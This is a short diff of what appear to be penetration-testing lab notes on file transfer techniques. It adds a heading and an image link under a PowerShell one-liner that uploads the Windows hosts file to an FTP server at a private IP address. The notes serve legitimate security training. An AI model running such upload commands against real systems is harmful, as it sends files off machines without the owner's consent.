@@ -323,3 +323,6 @@ Now let's use the PowerShell upload function to upload a file to our FTP Server.
 ```powershell
 PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
+#### Create a Command File for the FTP Client to Upload a File
+![](../../Attachements/Pasted%20image%2020260726211728.png)
+
